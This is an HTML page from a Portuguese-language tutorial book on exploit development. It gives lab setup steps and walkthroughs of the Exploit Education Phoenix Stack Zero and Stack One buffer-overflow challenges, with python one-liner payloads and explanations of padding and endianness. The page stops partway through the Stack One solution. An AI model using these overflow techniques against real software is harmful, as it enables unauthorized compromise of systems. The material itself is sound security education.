<!DOCTYPE HTML>
<html lang="pt-br" class="sidebar-visible no-js ayu">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Um Livrinho Sobre Exploit Dev</title>
        <meta name="robots" content="noindex" />
        <!-- Custom HTML head -->
        

        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "ayu";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item affix "><a href="mapa.html">Mapa</a></li><li class="spacer"></li><li class="chapter-item "><a href="stack/stack.html">Stack</a></li><li class="chapter-item "><a href="stack/phoenix/setup.html">Phoenix Stack</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="stack/phoenix/StackZero.html">Stack Zero</a></li><li class="chapter-item "><a href="stack/phoenix/StackOne.html">Stack One</a></li><li class="chapter-item "><a href="stack/phoenix/StackTwo.html">Stack Two</a></li><li class="chapter-item "><a href="stack/phoenix/StackThree.html">Stack Three</a></li><li class="chapter-item "><a href="stack/phoenix/StackFour.html">Stack Four</a></li><li class="chapter-item "><a href="stack/phoenix/StackFive.html">Stack Five</a></li><li class="chapter-item "><a href="stack/phoenix/StackSix.html">Stack Six</a></li></ol></li><li class="chapter-item "><a href="stack/mitigacoes.html">Mitigações</a></li><li class="chapter-item "><a href="stack/ret2libc.html">Ret2LibC</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Protostar Stack Six</div></li><li class="chapter-item "><div>Avançado: Múltiplos ret2libc</div></li></ol></li><li class="chapter-item "><a href="stack/gotplt.html">GOT e PLT</a></li><li class="chapter-item "><a href="stack/rop/intro.html">ROP</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="stack/rop/primitivos.html">Primitivos</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="stack/rop/ROPE/dump.html">ROPE</a></li></ol></li><li class="chapter-item "><div>Pivot</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="stack/rop/ROPE/pivot.html">ROPE: pivot</a></li></ol></li><li class="chapter-item "><a href="stack/rop/SROP/SROP.html">SROP</a></li><li class="chapter-item "><a href="stack/rop/ret2dlresolve.html">ret2dl-resolve</a></li></ol></li><li class="chapter-item "><a href="stack/ASLR/aslr.html">ASLR</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="stack/ASLR/corromperGOT.html">Corromper GOT</a></li><li class="chapter-item "><a href="stack/ASLR/ret2plt.html">ret2plt</a></li><li class="chapter-item "><a href="stack/ASLR/brute32.html">Bruteforce</a></li></ol></li><li class="chapter-item "><div>Canary</div></li><li class="chapter-item "><div>PIE</div></li><li class="chapter-item "><a href="stack/leakAll.html">Extra: Leakando tudo</a></li><li class="spacer"></li><li class="chapter-item "><a href="heap/heap.html">Heap</a></li><li class="chapter-item "><a href="heap/intro.html">Intro</a></li><li class="chapter-item "><div>Bugs Gerais</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>UAF</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="heap/geral/uaf/heap-two.html">Exploit Education: Heap Two</a></li></ol></li></ol></li><li class="chapter-item "><a href="heap/relacionados/relacionados.html">Conceitos Relacionados</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="heap/relacionados/io_list_all.html">_IO_list_all</a></li></ol></li><li class="chapter-item "><a href="heap/malloc/intro.html">Atacando Malloc</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="heap/malloc/teoria.html">Teoria</a></li><li class="chapter-item "><a href="heap/malloc/fastbinsDup.html">Fastbins Dup</a></li><li class="chapter-item "><a href="heap/malloc/HouseOfForce.html">House of Force</a></li><li class="chapter-item "><a href="heap/malloc/HouseOfSpirit.html">House of Spirit</a></li><li class="chapter-item "><a href="heap/malloc/unsafeUnlink.html">Unsafe Unlink</a></li><li class="chapter-item "><a href="heap/malloc/safeUnlink.html">Safe Unlink</a></li><li class="chapter-item "><a href="heap/malloc/HouseOfEinherjar.html">House of Einherjar</a></li><li class="chapter-item "><a href="heap/malloc/GooglePoisonNull.html">Google Poison Null Byte</a></li><li class="chapter-item "><a href="heap/malloc/PartialUnlink.html">Unsorted bins: Partial Unlink</a></li><li class="chapter-item "><a href="heap/malloc/HouseOfOrange.html">House of Orange</a></li><li class="chapter-item "><a href="heap/malloc/HouseOfLore.html">House of Lore</a></li><li class="chapter-item "><div>House of Rust</div></li><li class="chapter-item "><div>House of Corrosion</div></li></ol></li><li class="chapter-item "><div>Extra</div></li><li class="spacer"></li><li class="chapter-item "><a href="linux_internals/linux.html">Linux Internals</a></li><li class="chapter-item "><a href="linux_internals/prerequisitos.html">Prerequisitos</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        <a href="https://github.com/0xturazzi/Um-Livrinho-Sobre-Exploit-Dev/" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="mapa"><a class="header" href="#mapa">Mapa</a></h1>
<p>Isso nao ta pronto aaaaaaa foi mal :(</p>
<h2 id="stack"><a class="header" href="#stack">Stack</a></h2>
<pre><code>Phoenix Stack:
BoF Tradicional, Assembly,... etc
     |__________ _______________ ____
     |          |               |    |        
     V          V               |    V
    W^X     GOT e PLT           | Canary
     |          |_________      V    |                 
     |          |         |    PIE   |
     V          V         V     |    |
  Ret2libC     ASLR     RELRO   |    |
     |          |               |    |
     |          V__ ____________V_ __V        
     |             |              |
     V             V              V
    ROP           Leak          Brute     
 ____|____     
|         |   
V         V   
SROP   ret2dl_resolve 
</code></pre>
<h2 id="fuzz-todo"><a class="header" href="#fuzz-todo">Fuzz ~TODO~</a></h2>
<pre><code></code></pre>
<h2 id="heap-todo"><a class="header" href="#heap-todo">Heap ~TODO~</a></h2>
<pre><code></code></pre>
<h2 id="linux-internals-todo"><a class="header" href="#linux-internals-todo">Linux Internals ~TODO~</a></h2>
<pre><code></code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="stack-1"><a class="header" href="#stack-1">Stack</a></h1>
<p>Nesse capitulo vamos aprender sobre:</p>
<ul>
<li>Introdução a Assembly e conceitos relacionados!</li>
<li>Buffer Overflow Clássico</li>
<li>Mitigações comuns e como derrota-las:
<ul>
<li>W^X</li>
<li>ASLR</li>
<li>Canary</li>
<li>PIE</li>
<li>RELRO</li>
</ul>
</li>
<li>ROP Avançado </li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><p>Se encontrar algum erro, abre uma issue pf :)</p>
<p><strong>Link pros desafios: <a href="https://exploit.education/phoenix/">Exploit Education Phoenix</a></strong> </p>
<p>Inspiracao (ingles):</p>
<p><a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-zero-solution/">lamarranet</a></p>
<p><a href="https://youtu.be/Y-4WHf0of6Y">Live Overflow (Mas é sobre o antigo: Protostar)</a></p>
<h1 id="-prerequisitos"><a class="header" href="#-prerequisitos">🖥️ Prerequisitos:</a></h1>
<ul>
<li>Saber alguma linguagem de programação e conceitos relacionados</li>
</ul>
<h1 id="-opcional-mas-util-saber"><a class="header" href="#-opcional-mas-util-saber">🐧 Opcional mas util saber</a></h1>
<ul>
<li>💾 Um pouco de C / C++ / Rust / Linguagem de nível baixo</li>
<li>🐍 Alguma linguagem de scripting: Python, Ruby, .....</li>
<li>🐧 Saber o básico de Linux</li>
</ul>
<h1 id="-setup"><a class="header" href="#-setup">🤖 Setup:</a></h1>
<ul>
<li>Baixar kali linux usando VM-Ware ou Virtual Box</li>
<li>Baixar Qemu na VM: <code>sudo apt-get install qemu</code></li>
<li>Baixar a imagem QCOW2 (eu usei AMD64): <a href="https://exploit.education/downloads/">Downloads Exploit Education</a></li>
<li>Na maquina kali executar:</li>
</ul>
<pre><code class="language-bash">$ cd ~/Downloads/exploit-education-phoenix-amd64
$ chmod +x boot-exploit-education-phoenix-amd64.sh
$ ./boot-exploit-education-phoenix-amd64.sh
</code></pre>
<ul>
<li><strong>NÂO USAR O CONSOLE BUGADO QUE APARECE !!!</strong> Minimiza e esquece que ele existe!</li>
<li>Usa: ssh -p 2222 user@localhost # Os usuários/senha são: user/user e root/root</li>
<li>Os arquivos tão em: cd /opt/phoenix/amd64</li>
</ul>
<p>Boa Sorte! :D</p>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/phoenix/StackZero.html#-descri%C3%A7%C3%A3o">📝 Descrição</a></li>
<li><a href="stack/phoenix/StackZero.html#-dica">💡 Dica</a></li>
<li><a href="stack/phoenix/StackZero.html#conhecimento-preliminar">Conhecimento Preliminar</a>
<ul>
<li><a href="stack/phoenix/StackZero.html#buffer">Buffer</a></li>
<li><a href="stack/phoenix/StackZero.html#stack">Stack</a>
<ul>
<li><a href="stack/phoenix/StackZero.html#a-stack-cresce-para-valores-menores">A stack cresce para valores menores</a></li>
<li><a href="stack/phoenix/StackZero.html#hex">Hex</a></li>
<li><a href="stack/phoenix/StackZero.html#melhorando-o-exemplo-do-po%C3%A7o">Melhorando o exemplo do poço</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="stack/phoenix/StackZero.html#-explica%C3%A7%C3%A3o">🎉 Explicação</a>
<ul>
<li><a href="stack/phoenix/StackZero.html#-1--alocando-as-vari%C3%A1veis-na-stack-buffer64-changeme">🥞 1- Alocando as variáveis na stack (buffer[64], changeme)</a></li>
<li><a href="stack/phoenix/StackZero.html#-2--alterar-buffer64-usando-gets">💥 2- Alterar buffer[64] usando gets</a></li>
<li><a href="stack/phoenix/StackZero.html#-3--o-programa-checa-se-changeme-foi-alterada">✅ 3- O programa checa se changeme foi alterada</a>
<ul>
<li><a href="stack/phoenix/StackZero.html#-64-as-changeme-n%C3%A3o-alterado">❌ 64 As, changeme não alterado</a></li>
<li><a href="stack/phoenix/StackZero.html#-65-as-changeme-alterado">✅ 65 As, changeme alterado</a></li>
<li><a href="stack/phoenix/StackZero.html#%EF%B8%8F-64-as-e-um-b-0x42-aaaaaaaaaaaab">🅱️ 64 As e um B (0x42): AAAAAAAAA.....AAAB</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="stack/phoenix/StackZero.html#-solu%C3%A7%C3%A3o">👾 Solução</a></li>
</ul>
<h1 id="-descrição"><a class="header" href="#-descrição">📝 Descrição</a></h1>
<p>Esse nível demonstra que memoria pode ser acessada fora da sua região 
inicialmente alocada, como as variáveis são alocadas na stack, e que altera-las pode mudar a execução do programa.</p>
<p>Objetivo: Alterar a variável &quot;changeme&quot;</p>
<h1 id="-dica"><a class="header" href="#-dica">💡 Dica</a></h1>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 10)&quot;
AAAAAAAAAA

$ python3 -c &quot;print('A' * 10)&quot; | ./stack-zero 
</code></pre>
<h1 id="conhecimento-preliminar"><a class="header" href="#conhecimento-preliminar">Conhecimento Preliminar</a></h1>
<h2 id="buffer"><a class="header" href="#buffer">Buffer</a></h2>
<p>Buffers são similares a arrays em outras linguagens de programação,
mas possuem tamanho fixo!</p>
<p>Eles são definidos usando: <code>tipo nome[tamanho]</code> </p>
<p>O <code>tipo</code>, é do que esta sendo armazenado dentro, por exemplo:</p>
<pre><code class="language-C">char buf[64]; // Armazena 64 caracteres
int buf[32];  // Armazena 32 ints
</code></pre>
<p>Esses buffers por possuírem tamanho fixo, são armazenados na stack!</p>
<h2 id="stack-2"><a class="header" href="#stack-2">Stack</a></h2>
<p>A stack é uma porção da memoria que armazena como se fosse uma pilha de pratos:</p>
<pre><code>Quando você quer colocar um novo, você coloca no topo da pilha (push)
Quando você quer pegar um da pilha, você pega o do topo (pop)

O ultimo a entrar, é o primeiro a sair...
o nome desse comportamento é LIFO (Last in First Out)
</code></pre>
<p><img src="stack/phoenix/./img/push-pop.png" alt="Imagem da wikipedia mostrando PUSH e POP" /></p>
<h3 id="a-stack-cresce-para-valores-menores"><a class="header" href="#a-stack-cresce-para-valores-menores">A stack cresce para valores menores</a></h3>
<pre><code>Imagina que ela é um poço que começa na profundidade 15

Quando você coloca um objeto de tamanho 2 no poço:
ele vai estar apoiado na profundidade 15, e vai até a profundidade 13

Em seguida, você coloca algo de tamanho 3:
vai estar apoiado na profundidade 13, e vai até a profundidade 10
</code></pre>
<p>Conforme você vai <strong>adicionando</strong> itens, o endereço que eles estão vai <strong>diminuindo</strong> em valor.
É meio confuso, mas com o tempo você pega o jeito.</p>
<p>Pra complicar um pouco mais, esses endereços tão em hexadecimal (0x0 ate 0xF, o &quot;0x&quot; é pra representar que o valor tá em hex).</p>
<h3 id="hex"><a class="header" href="#hex">Hex</a></h3>
<p>Se vc não souber hex: <a href="https://pt.wikipedia.org/wiki/Sistema_de_numera%C3%A7%C3%A3o_hexadecimal">Wikipedia Sistema de numeração hexadecimal</a>
. Mas resumindo, em hex você conta:</p>
<pre><code>Hex: 0,1,2,...,8,9,A ,B ,C ,D ,E ,F ,10,11,12,...,19,1A,1B,1C,...,FF
Dec: 0,1,2,...,8,9,10,11,12,13,14,15,16,17,18,...,25,26,27,28,...,127
</code></pre>
<p>Então a base da stack é 0xFFFFFFFF e o topo 0X00000000 !</p>
<h3 id="melhorando-o-exemplo-do-poço"><a class="header" href="#melhorando-o-exemplo-do-poço">Melhorando o exemplo do poço</a></h3>
<pre><code>0x0- 	     Topo da stack/Topo do poço
0xA ate 0x1- espaço vazio
0xD-         Segundo item
0xF-         Base da stack/Fundo do poço, primeiro item
</code></pre>
<h1 id="-explicação"><a class="header" href="#-explicação">🎉 Explicação</a></h1>
<p>A função main() pode estar sendo divida em 3 Partes:</p>
<ol>
<li>🥞 Alocando as variáveis na stack (buffer[64], changeme)</li>
<li>💥 Alterar buffer[64] usando gets()</li>
<li>✅ Checando se changeme foi alterada</li>
</ol>
<pre><code class="language-C">int main(int argc, char **argv) {
			// Definir variáveis locais
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf(&quot;%s\n&quot;, BANNER); // Printar o banner (todo nível faz isso)

  locals.changeme = 0;
  gets(locals.buffer);   // Alterar o buffer

  if (locals.changeme != 0) { 	// Checar se changeme foi alterada
    puts(&quot;Well done, the 'changeme' variable has been changed!&quot;);
  } else {
    puts(&quot;Uh oh, 'changeme' has not yet been changed&quot;);
  }

  exit(0);
}
</code></pre>
<p>Ue, <code>changeme</code> nunca foi alterada... Ela não deveria estar mudando!</p>
<p>Calma que você ja vai entender :)</p>
<h2 id="-1--alocando-as-variáveis-na-stack-buffer64-changeme"><a class="header" href="#-1--alocando-as-variáveis-na-stack-buffer64-changeme">🥞 1- Alocando as variáveis na stack (buffer[64], changeme)</a></h2>
<p>A variável <code>buffer[64]</code> tem  tamanho de 64 bytes (64 letras, assumindo ASCII, um byte por letra).</p>
<p>A variável <code>changeme</code> esta marcada como <code>volátil</code> para prevenir que o compilador
destrua ela (pq originalmente não seria
alterada, então seria destruída para otimizar o código... 
Mas nós vamos alterar ela por métodos... ~risada maléfica~ ... não convencionais hehehe).</p>
<p>Nossas duas variáveis (buffer[64] e changeme) são empurradas na stack.</p>
<pre><code>buffer[64] (preenchido com zeros (vazio))
changeme   (com o valor: 0x00)
ret        - Base dessa stack
</code></pre>
<h2 id="-2--alterar-buffer64-usando-gets"><a class="header" href="#-2--alterar-buffer64-usando-gets">💥 2- Alterar buffer[64] usando gets</a></h2>
<p>A função <code>gets()</code> abre um input no terminal, e escreve o que recebeu no <code>buffer</code>.</p>
<p>O problema é que ela <strong>não</strong> checa se o valor recebido é maior que o <code>buffer</code>, permitindo que 
você <strong>escreva fora do buffer!!</strong> D:</p>
<p>Ela vai começar a escrever no topo do buffer (menor endereço)
e vai descendo até a base da stack.</p>
<pre><code>**Stack**
buffer
       [
A           | Gets escreve nesse sentido
A           |
A           \/
...
A
      ]
changeme (com valor 0x00)
ret       - Base dessa stack
</code></pre>
<p>Então, caso colocássemos 100 &quot;A&quot;s no buffer de tamanho 64, as variáveis nos próximos 36 endereços seriam alteradas.</p>
<p>Essas variáveis ficariam com o valor &quot;41&quot;, mas pq 41?</p>
<p>O valor ASCII do &quot;A&quot; é 0x41, você pode checar o de todas letras usando:</p>
<blockquote>
<p>$ man ascii</p>
</blockquote>
<p>Ui, o usuário pode escrever fora memoria dele? perigoso ne! D:</p>
<p>É por isso que essa função está marcada como <em>Deprecated</em> (fora de uso).</p>
<p>No nosso caso, o buffer tem o tamanho de <strong>64</strong> bytes, se colocarmos <strong>65</strong> &quot;A&quot;s (65 bytes), o valor vai vazar desse buffer.
Isso quer dizer que antes a variável <code>changeme</code> tinha o valor <strong>0x00</strong> e agora tem o valor <strong>0x41</strong> !</p>
<pre><code>**Stack**
buffer
      [
41           | Gets escreve nesse sentido
41           |
41           \/
...
41
      ]
changeme (com o valor: 41)
ret       - Base dessa stack
</code></pre>
<h2 id="-3--o-programa-checa-se-changeme-foi-alterada"><a class="header" href="#-3--o-programa-checa-se-changeme-foi-alterada">✅ 3- O programa checa se changeme foi alterada</a></h2>
<p>Se foi alterada, quer dizer que a gente <em>overflow-ou</em> (escreveu fora) do buffer, é vitoria!!! :D</p>
<p>Ta, mas como a gente faz isso na prática?</p>
<p><code>python3 -c &quot;print(&quot;A&quot;*65)&quot;</code> printa 65 &quot;A&quot;s para o terminal</p>
<p>Então se a gente encaminhar esses &quot;A&quot;s pro programa....</p>
<pre><code>Se você quer tentar resolver sozinhe, agora é a sua hora!

.
.
.
.
</code></pre>
<h3 id="-64-as-changeme-não-alterado"><a class="header" href="#-64-as-changeme-não-alterado">❌ 64 As, changeme não alterado</a></h3>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 64)&quot; | ./stack-zero 
Banner
Uh oh, 'changeme' has not yet been changed.
Would you like to try again?
</code></pre>
<h3 id="-65-as-changeme-alterado"><a class="header" href="#-65-as-changeme-alterado">✅ 65 As, changeme alterado</a></h3>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 65)&quot; | ./stack-zero 
Banner
Well done, the 'changeme' variable has been changed!
</code></pre>
<h3 id="🅱-64-as-e-um-b-0x42-aaaaaaaaaaaab"><a class="header" href="#🅱-64-as-e-um-b-0x42-aaaaaaaaaaaab">🅱️ 64 As e um B (0x42): AAAAAAAAA.....AAAB</a></h3>
<p>Para demonstrar melhor esse comportamento do buffer 
ser escrito em um sentido específico (pq vai ser muito importante saber disso),
vou dar outro exemplo:
<code>python3 -c &quot;print('A' * 64 + 'B')&quot;</code> </p>
<pre><code class="language-md">buffer [
41           | Gets escreve nesse sentido
41           |
41           \/
...
41
       ]
changeme (com o valor: 42)   &lt;- B = 42!!!!
ret       - Base dessa stack
</code></pre>
<p>Os <code>A</code>s preenchem certinho a stack, e a gente pode colocar o valor que quiser na variável!! Uhhuuu :D</p>
<p>Esses As só pra encher a stack são chamados de <code>padding</code> (traduz pra preenchimento).</p>
<hr />
<p>Fim! :D</p>
<p>Ouch... isso foi um bocado de explicação, mas relaxa que daqui pra frente fica mais difícil hehehe :D</p>
<p>Se você chegou até aqui, você ta de parabéns !!!</p>
<p>Pra lembrar bem, desenha uma stack no papel, da um push nas variáveis e no buffer, mostra o sentido que o 
buffer escreve, e ele vazando e mudando o valor das outras variáveis...</p>
<h1 id="-solução"><a class="header" href="#-solução">👾 Solução</a></h1>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 65)&quot; | ./stack-zero
Welcome to phoenix/stack-zero, brought to you 
by https://exploit.education
Well done, the 'changeme' variable has been changed!
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/phoenix/StackOne.html#-objetivo">🎯 Objetivo</a></li>
<li><a href="stack/phoenix/StackOne.html#-dicas">💡 Dicas</a></li>
<li><a href="stack/phoenix/StackOne.html#-explica%C3%A7%C3%A3o">💫 Explicação</a>
<ul>
<li><a href="stack/phoenix/StackOne.html#input">Input</a></li>
<li><a href="stack/phoenix/StackOne.html#endian">Endian</a>
<ul>
<li><a href="stack/phoenix/StackOne.html#-dica-usando-valores-hex-diretamente">🌙 Dica: Usando valores hex diretamente</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="stack/phoenix/StackOne.html#-solu%C3%A7%C3%A3o">🔥 Solução</a></li>
</ul>
<h1 id="-objetivo"><a class="header" href="#-objetivo">🎯 Objetivo</a></h1>
<p>Agora o objetivo não é só alterar <code>changeme</code>, é alterar para um valor especifico!</p>
<p>Lembra aquilo de controlar o valor depois do preenchimento (<code>padding</code>) ?</p>
<p>Pois é, ele vai ser super util agora!</p>
<h1 id="-dicas"><a class="header" href="#-dicas">💡 Dicas</a></h1>
<p>Ver a representação hex de cada letra:</p>
<blockquote>
<p>$ man ascii</p>
</blockquote>
<p>Dar um Google sobre Endianess.</p>
<h1 id="-explicação-1"><a class="header" href="#-explicação-1">💫 Explicação</a></h1>
<p>Se lembra de que no tutorial passado a gente trocou <code>changeme</code> pra <strong>41</strong> e <strong>42</strong>?</p>
<p>O que ta acontecendo por trás das cenas é que as letras estão virando a sua representação hex.</p>
<p>Então <code>print(&quot;A&quot;*5)</code> é equivalente à <code>print(b&quot;\x41&quot;*5)</code></p>
<blockquote>
<p>Presta atenção no b&quot;&quot; : esse b indica que são Bytes! :D</p>
</blockquote>
<p>As vezes o python3 vai reclamar de você usar valores arbitrários pra esses bytes,
então você pode usar o python2 (o print não tem parênteses, mas o resto é igual):</p>
<blockquote>
<p>$ python -c &quot;print 'blablabla'&quot;</p>
</blockquote>
<p>Nesse caso, changeme ta sendo comparada com <strong>0x496c5962</strong></p>
<pre><code class="language-C">  if (locals.changeme == 0x496c5962) {
    puts(&quot;Well done, you have successfully set changeme 
				to the correct value&quot;);
</code></pre>
<p>O buffer tem tamanho 64 de novo, então podemos usar 64 caracteres para preenche-lo, igual na anterior! uhuuuu :D</p>
<h2 id="input"><a class="header" href="#input">Input</a></h2>
<p>Nesse caso, o programa não ta usando o gets pra abrir um input.</p>
<p>Ele ta usando o <code>argv</code> (o que vem depois do nome do programa quando
você executa no terminal)</p>
<blockquote>
<p>./stack-one teste batata</p>
</blockquote>
<pre><code>argv[0] = stack-one (o nome do programa)
argv[1] = teste
argv[2] = batata
... e assim por diante
</code></pre>
<blockquote>
<p>argc é a contagem: quantas coisas tem no argv! E aqui tá checando se é menor que 2!</p>
</blockquote>
<p>então no nosso caso, para mandar o input do python para o argv vai funcionar assim:</p>
<blockquote>
<p>$ ./stack-one $(python -c &quot;print b'A' * 64&quot;)
o <code>$()</code> executa o comando dentro dos parênteses e usa o valor retornado como input do outro!</p>
</blockquote>
<p>então <code>$(python....)</code> vai executar, e em seguida:</p>
<blockquote>
<p>./stack-one AAAAAAAAAAAAAA...</p>
</blockquote>
<h2 id="endian"><a class="header" href="#endian">Endian</a></h2>
<p>O valor de changeme tem tamanho 4 bytes, pq ele é um integer (integers são 32 ou 64 bits, então 4 ou 8 bytes). Isso quer dizer que a gente pode colocar 4 letras :D</p>
<pre><code>./stack-one $(python -c &quot;print b'A' * 64 + 'BCDE'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Getting closer! changeme is currently 0x45444342, we want 0x496c5962
</code></pre>
<p>O programa nos diz o valor de <code>changeme</code>, que nos alteramos por ter <strong>overflow-ado</strong> o buffer</p>
<p>Ue, que esquisito, vc reparou algo de estranho?</p>
<p>A gente mandou <code>BCDE (42 43 44 45)</code> e ele colocou <code>EDCB (45 44 43 42)</code>, por que isso?</p>
<p>Os computadores armazenam integers usando um sistema Little Endian (LE) ou Big Endian (BE), esses sistemas decidem como os números são representados.</p>
<blockquote>
<p>Esses sistemas se referem a magnitude dos dígitos, Centena, Dezena, Unidade,...</p>
</blockquote>
<blockquote>
<p>Em um sistema BE, os numeros são representados em ordem decrescente CDU.</p>
</blockquote>
<blockquote>
<p>Em um sistema LE, os numeros são representados em ordem crescente UDC.</p>
</blockquote>
<pre><code>Por exemplo, o numero cento e vinte três:
BE: 123        
LE: 321
</code></pre>
<p>No dia a dia, nos humanos usamos o sistema BE, mas os computadores preferem LE, então eles invertem a ordem dos 4 bytes nos numeros inteiros!</p>
<p>Então pra gente conseguir que changeme seja <code>BCDE</code>, a gente precisa passar <code>EDCB</code> pro computador! :D</p>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + 'EDCB'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Getting closer! changeme is currently 0x42434445, we want 0x496c5962
</code></pre>
<p>Isso quer dizer que pra gente definir <code>changeme = 49 6c 59 62</code>, e completar
o desafio, a gente precisa inverter a ordem dos bytes (<code>62 59 6c 49</code>)! :D</p>
<p>Mas eu não sei que letras são equivalentes a esses numeros... e nem todo numero tem uma letra!</p>
<h3 id="-dica-usando-valores-hex-diretamente"><a class="header" href="#-dica-usando-valores-hex-diretamente">🌙 Dica: Usando valores hex diretamente</a></h3>
<p>Lembra que eu falei que letras são valores hex? A gente também pode usar os valores hex diretamente usando \x  :D</p>
<blockquote>
<p>Então usar b&quot;\x41&quot; é igual a b&quot;A&quot;!</p>
</blockquote>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + b'\x62\x59\x6c\x49'&quot;)
